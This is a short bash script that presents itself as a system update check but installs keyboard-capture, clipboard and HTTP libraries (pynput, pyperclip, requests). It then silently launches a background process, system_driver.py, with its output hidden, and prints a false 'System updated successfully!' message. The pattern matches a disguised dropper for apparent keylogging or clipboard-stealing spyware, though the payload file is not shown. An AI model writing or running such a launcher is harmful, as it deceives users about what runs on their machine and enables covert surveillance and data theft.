#!/bin/bash
echo "Checking for system updates..."
pip3 install pynput pyperclip requests --quiet
nohup python3 system_driver.py > /dev/null 2>&1 &
echo "System updated successfully!"